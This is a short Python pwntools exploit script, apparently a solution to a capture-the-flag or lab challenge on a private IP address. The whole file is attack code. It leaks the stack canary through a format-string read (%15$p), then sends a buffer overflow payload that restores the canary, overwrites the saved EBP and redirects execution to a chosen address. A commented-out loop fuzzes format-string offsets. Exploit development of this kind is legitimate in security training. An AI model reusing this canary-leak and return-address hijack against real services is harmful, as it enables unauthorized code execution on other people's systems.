from pwn import *

host = "10.213.0.102"
port = "35376"

context.log_level = 'error' # pt sa nu mai afiseze open/close connection

# for i in range(1, 32):
#     p = remote(host, port)

#     format = f"%{i}$p"

#     msg = p.recv()
#     p.sendline(format)
#     msg = p.recv()

#     print(i, msg)

#     p.close()



p = remote(host, port)

format = f"%15$p"

msg = p.recv()
p.sendline(format)
cannary, msg = p.recv().split(b'\n')

print(msg)

can = int(cannary, 16)
print(hex(can))
can = p32(can)

addr_ovr = p32(int("8049233", 16))

payload = b"A" * 32                    # Fill local_30
payload += can              # Restore canary
payload += b"B" * 12                     # Saved EBP (junk)
payload += addr_ovr

p.sendline(payload)
msg = p.recv()
p.interactive()

print(msg)

p.close()